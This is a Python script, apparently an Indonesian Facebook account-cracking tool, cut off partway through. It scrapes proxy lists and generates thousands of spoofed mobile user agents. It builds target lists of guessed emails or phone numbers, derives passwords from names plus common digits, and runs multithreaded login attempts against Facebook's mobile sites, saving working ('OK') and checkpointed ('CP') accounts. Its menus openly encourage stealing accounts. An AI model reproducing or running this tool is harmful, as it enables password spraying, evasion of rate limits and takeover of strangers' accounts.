P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
###KOLOR
ab_ = "\33[30;1m" #abu2
m_ = "\33[31;1m" # merah
h_ = "\33[32;1m" # hijau
k_ = "\33[33;1m" # kuning
bt_ = "\33[34;1m" # biru tua
u_ = "\33[35;1m" # ungu
bm_ = "\33[36;1m" # biru muda
p_ = "\33[37;1m" # putih
#KENDOR
br = '\33[1;41m' #red
bh = '\33[1;42m' #ijo
bk = '\33[1;43m' #kun
bbt = '\33[1;44m' #biru
bp = '\33[1;45m' #pink
bhm = '\33[1;46m' #hijau muda 
bw = '\33[1;47m' #putih
bp = '\33[1;40m' #hapus b


###---[ IMPORT MODULE ]---###

import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep

hp = platform.platform()
ses = requests.Session()

try:
	import pyfiglet

except ImportError:
	os.system('pip install pyfiglet')



def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['6','10009']:tahunz = '2023'
		else:tahunz=''

	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz


def login():
  os.system("clear")

###---[ TANGGAL ]---###

sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

now = datetime.now()
hari = now.day
blx = now.month

try:

	if blx < 0 or blx > 12:exit()

	xx = blx - 1

except ValueError:exit()

#if hp not in out:exit()

bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)

sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'

warna_warni_biasa=random.choice([H,K,M,O,B,U])

garis = f" {P}[{warna_warni_biasa}•{P}]"



###---[ APPEND ]---###

dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, ugen2, ugen, ugen5, redmi = [], [], [], [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0
uafarz =[]



###---[ CLEAR LAYAR ]---###

def clear_layar():
	try:os.system('clear')
	except:pass

	



###---[ GLOBAL KEMBALI ]---###

def back():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()

###---[ AUTO CREATE UA & PROXY ]---###

try:
	clear_layar()
	print(f'\r\n └─ Sedang Dump Proxy dan Create UserAgent')
	os.system("clear")
	try:os.remove('.proxy.txt')
	except:pass

	A = ''
	one = ses.get('https://spys.me/socks.txt').text
	for x in one.splitlines():
		if '+' in x:
			if '.' in x:
				p = x.split(' ')[0]
				A += '\n'+p
	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(f" └─ Internet error")

for xd in range(1000):
    build_nokiax = ['JDQ39','JZO54K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice([ugent1, ugent2, ugent3])
    ugen.append(memekk)

    

for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0; '
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Hisense F102) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen5.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us;'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)



for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; Android{str(rr(8,10))}; vivo Y21 {str(rr(4,9))} Build/LMY47I.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	pf = f'{A}{B}{C}{D}'

	if pf in redmi:pass
	else:redmi.append(pf)
	A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
	B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
	C = f'10.9.2.{str(rr(111,999))} U3/0.0 Mobile Safari/534.30'
	mi = f'{A}{B}{C}'

	if mi in redmi:pass
	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; U; Android 8; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.22.7.36.1'
	F = f'{A}{C}{D}{E}'
	if F in redmi:pass
	else:redmi.append(F)

try:abcd = open('.proxy.txt','r').read().splitlines()
except:sys.exit(f" └─ Gagal Dump Proxy")
print(f' └─ Total New Proxy : '+str(len(abcd)))
print(f' └─ Total UserAgent : '+str(len(redmi)))
sleep(1)

	
nls = (f'''
{bm_}
┏━┓╋┏┳┓╋╋┏━━━┓╋╋╋╋╋╋╋╋╋╋┏┓
┃┃┗┓┃┃┃╋╋┃┏━┓┃╋╋╋╋╋╋╋╋╋╋┃┃
┃┏┓┗┛┃┃╋╋┃┗━━┓┏━━┳┓┏┳━━┳┫┃
┃┃┗┓┃┃┃╋┏╋━━┓┃┃┃━┫┗┛┃┏┓┣┫┃
┃┃╋┃┃┃┗━┛┃┗━┛┃┃┃━┫┃┃┃┏┓┃┃┗┓
┗┛╋┗━┻━━━┻━━━┛┗━━┻┻┻┻┛┗┻┻━┛ 
{p_}''')

###---[ MENU UTAMS ]---###
def kontol():
	os.system("clear")
	print (nls)
	print(f'''
{p_}[{h_}1{p_}] {h_}Crack email
{p_}[{h_}2{p_}] {h_}Cek hasil
{p_}[{h_}3{p_}] {h_}Crack file {p_}[{h_} Masa percobaan {p_}]
{p_}[{h_}4{p_}] {h_}Crack nomor {p_}[{h_} Sandi harus manual !!! {p_}]
{p_}[{h_}0{p_}] {m_}Keluar''')
	menu = input(f"{h_} └─  ")
	if menu in ['1','01']:clon_email()
	elif menu in ['2','02']:cek_hasil()
	elif menu in ['3','03']:crack_file()
	elif menu in ['4',"04"]:crack_nomor()
	elif menu in ['0','00']:exit()
	
	
	
	else:print(f" {h_}└─{m_} Menu tidak di temukan !!!");time.sleep(2);kontol()
	

def error():
	print(f" {h_}└─ {k_}Menu sedang di update 😎")
	time.sleep(2)
	kontol()

###---[ DETEKSI CHECKPOINT ]---###

detek = []

def cek_opsi_cp():
	nom, no = [], 0
	try:ok = os.listdir('CP')
	except:sys.exit(f"\033[95m[{M}>{K}] Tidak Ada Hasil Cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f'\033[95m[{kk}{no}{P}] {x} - {kk}{len(jum)} {P}Akun')	
	exc = input(f'\033[95m[{kk}<{O}] Nomor Yang Akan Di Cek\n\033[95m[{kk}<{P}] Pilih Nomor  : ')
	file = nom[int(exc)-1]
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = random.choice(redmi)
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r\033[95m[{hh}<{K}] Cek Opsi Checkpoint Telah Selesai')
	
###---[ CEK AKUN AMAN ]---###
def cek_akun():
	sesi , nga = 0 , 0
	no,nom = 0,[]
	try:ok = os.listdir('OK')
	except:sys.exit(f"\033[95m[{M}>{H}] Tidak Ada Hasil Ok")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('OK/'+x,'r').readlines()
		except:continue
		print(f'\033[95m[{hh}{no}{P}] {x} - {hh}{len(jum)} {P}Akun')	
	exc = input(f'\033[95m[{hh}<{O}] Nomor File Yang Akan Di Cek\n\033[95m[{hh}!{P}] File : ')
	xxx = input(f'\033[95m[{hh}>{O}] Simpan Akun Tidak Kenon Ke File Apa : \n\033[95m[{hh}>{P}] Nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(f'\033[95m[{hh}!{O}] Akun Tidak Kenon Di : {nonon}\n\033[95m[{hh}!{O}] Akun Yang Kenon Di  : Buang Goblok')

	try:
		uuid = open('OK/'+file,'r').read().splitlines()
		mek = 0
		for data in uuid:
			print(f'\r\033[95m[{hh}>{P}] Aman : {nga} Down : {sesi}',end='')
			sys.stdout.flush()
			try:user,nama = data.split('|')
			except:exit(f"\033[95m[{M}>{M}] Pemisah Salah")
			xx = open(nonon,'a')
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']
				print(f'\r\033[95m[{hh}{mek}{P}] {user}|{nama}                    ')
				nga+=1
				ni = f'{user}|{nama}\n'
				xx.write(ni)
			except:
				print(f'\r\033[95m[{M}{mek}{P}] {user}|{nama}                  ')
				sesi+=1
	except Exception as e :
		exit(f"\033[95m[{M}>{M}] File Tidak Ada")

###---[CEK HASIL CRACK ]---###

def cek_hasil():
	no,nom = 0,[]
	one = input(f'\n{p_}[{h_}1]{p_} Akun {h_}Ok \n{p_}[{h_}2{p_}] {p_}Akun {k_}Cp\n {h_}└─ {p_}Pilih Menu :{h_} ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" {h_}└─ {p_}Tidak Ada Hasil {h_}Ok\n {h_}└─ {m_}Silahkan maling dulu !!!")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f'{p_}[{hh}{no}{P}] {x} - {hh}{len(jum)} {P} {p_} Akun')	
		abc = input(f'{h_} └─ {p_}Nomor File :{h_} ')
		if abc in ['']:
			print(f"{m_}Pilih lah anjenkkk")
			exit()

		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f" {h_}└─ {m_}File Tidak Ada ")
		print(hh+buka+P)
		input(f"{h_} └─ {p_}Kembali")
		kontol()

	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f" {h_}└─ {p_}Tidak ada akun{k_} cp")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f'{p_}[{kk}{no}{P}] {x} - {kk}{len(jum)} {P}{p_} Akun')		
		abc = input(f'\033[95m {h_}└─ {p_}Nomor File : {h_}')
		if abc in ['']:
			print(f'{m_}Pilih lah anjenk !!!')
			exit()

		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f" {h_}└─ {p_}File Tidak Ada Hasil {k_}Cp")
		print(kk+buka+P)
		input(f" {h_}└─{p_} Kembali")
		kontol()

	else:sys.exit(f" {h_}└─ {p_}Isi Yang Benar")

###---[ DUMP NO LOGIN ]---###

def crack_nomor():
	print(f' {h_}└─{p_} Masukan awalan nomor [{m_}ex:085{p_}]')
	depan = input(f' {h_}└─{p_} ')
	if len(depan)==3:pass
	else:exit(f' {h_}└─{p_} Awalan salah ')
	jumla = input(f' {h_}└─{p_} Jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in dump:pass
		else:dump.append(D+'|123456')
		print(f'\r {h_}└─{m_}Dump  %s id'%(len(dump)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	atur_atur()

		



def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']

	global ok , cp
	os.system('clear')
	nama = input(f'{nls}\n\n {h_}└─ {p_}Masukkan Nama Target  {p_}({h_}only name{p_}):{h_} ')

	if ',' in str(nama):
		exit(f' {h_}└─{m_} Masukkan 1 Nama Saja')
	print(f' {h_}└─{p_} Contoh Domain : {h_}@gmail.com,@yahoo.com')
	doma = input(f'{h_} └─{p_} Masukkan Domain : {h_}')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' {h_}└─{m_} Domain harus ada . dan @')
	jumlah = input(f' {h_}└─ {p_}Total target ?!  : {h_}')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==5000:atur_atur()
		print(f'{p_}Sedang Dump {h_}%s{p_} Id\n'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()
##____________CRACK FILE__________##
def crack_file():
	file = input(f'{h_} └─ {p_}Contoh {p_}[ {h_}/sdcard/dump/dump1.txt {p_}]\n {h_}└─ {p_}Lokasi :{h_} ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" {h_}└─ {p_}Pemisah {p_}[ {h_}|{p_} ]\n {h_}└─{m_} Pemisah/sekat salah !!!")
			dump.append(data)
			print(f'\r {h_}└─{p_} Mengumpulkan{h_} %s {p_}IDs'%(len(dump)),end=" ")
			sleep(0.0000003)

	except FileNotFoundError:exit(f"{h_} └─ {m_}File tidak ada/salah folder file dump !!!")
	print(f' {h_}└─ {p_}Total IDs {h_}{len(dump)}')
	atur_atur()
	
	
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	os.system('clear')
	print (nls)
	ro = input(f'\n\n{p_}[{h_}1{p_}] {p_}Mobile\n{p_}[{h_}2{p_}] {p_}Mbasic\n{p_}[{h_}3{p_}] {p_}Free\n {h_}└─ {p_}Pilih Metode : {h_}')

	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	elif ro in ['3','03']:metode.append('free')
	#elif ro in ['2','02']:metode.append('mobile')
	#elif ro in ['3','03']:metode.append('mobile')

	else:metode.append('mobile')

	ch = input(f'''
{p_}[{h_}1{p_}] {p_}IDs Old
{p_}[{h_}2{p_}] {p_}IDs New
{p_}[{h_}3{p_}] {p_}IDs Mix/Random
 {h_}└─ {p_}Sortiran IDs :{h_} ''')

	if ch in ['1','01']:
		for x in dump:
			id.append(x)

	elif ch in ['2','02']:
		for x in dump:
			id.insert(0,x)

	elif ch in ['3','03']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)

	else:
		for x in dump:
			id.append(x)


	cp = input(f' {h_}└─ {p_}Add opsi {p_}[{h_}y/t{p_}] {p_}: {h_}')
#	cp =("y")

	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')

	#apk = input(f' {h_}└─ {p_}Tampilan apk  {p_}[{h_}y/t{p_}]{p_} : {h_}')
	apk = ("y")
	if apk in ['y','Ya','ya','1']:akunok.append('coki')
	else:akunok.append('coki')

	ch = input(f'\n{p_}[{h_}1{p_}]{p_} Pw Manual \n{p_}[{h_}2{p_}]{p_} Pw Otomatis {p_}[{h_} Saran  {p_}]\n {h_}└─ {p_}Pilih Sandi  : {h_}')

	if ch in ['1','01']:manual()
	#elif ch in ['3','03']:gabung()
	elif ch in ['2','02']:otomatis()

	else:otomatis()

	

from datetime import datetime    	

###---[ ATUR SANDI ]---###
def pepex():
	print ("Menu dalam proses perbaikan !!!")
	time.sleep(2)
	atur_atur()
	
def manual():
	global ok,cp
	pwx = []
	B = input(f' {h_}└─ {p_}Password manual\n {h_}└─ {p_}:{h_}  ').split(',')
	for x in B:
		pwx.append(x)

	print(f'\n {p_}└─ {h_}AKUN OK > {sim_ok}\n {p_}└─ {k_}AKUN CP > {sim_cp}\n')


	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {p_}└─ {p_}Crack Selesai \n{p_} └─ {p_}OK :{h_} {ok}\n {p_}└─ {p_}CP : {k_}{cp} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["bagong"]
	B = input(f' {h_}└─ {p_}Masukan sandi manual :{h_}  ').split(',')
	#C = input(f' {h_}└─ {p_}Masukan angka/apapun :{h_} ')
	#if ',' in str(C):
		#exit(f" {h_}└─ {m_}Misal 01 !!!")
	print(f' {p_}└─ {h_}Akun OK Di : {sim_ok}\n {p_}└─ {k_}Akun CP Di : {sim_cp}')

	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")
					#pwx.append(depan+C)

			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12345")
							pwx.append(tengah+"123456")
							#pwx.append(tengah+C)
							pwx.append(nama)

					except:
						pwx.append(nama)

				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(tengah+"1234")
					pwx.append(tengah+"12345")
					pwx.append(depan+"123456")
					#pwx.append(depan+C)

			if 'mobile' in metode:
